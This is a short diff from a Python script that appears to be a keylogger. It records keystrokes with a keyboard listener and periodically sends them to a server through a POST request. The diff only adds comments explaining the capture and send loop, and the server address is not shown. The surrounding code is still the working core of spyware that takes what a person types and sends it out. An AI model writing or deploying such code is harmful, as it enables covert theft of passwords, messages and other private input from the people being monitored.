@@ -69,6 +69,12 @@ def on_press(key):
     else:
         text += str(key).strip("'")
     
+# we put a listener to receive active keyboard presses
+# on_press function forms valid data to send to the server
 with keyboard.Listener(on_press=on_press) as listener:
+
+    # send request to the server
     send_post_request()
+
+    # Waits until the thread terminates, so we'll send request once per time interval
     listener.join()
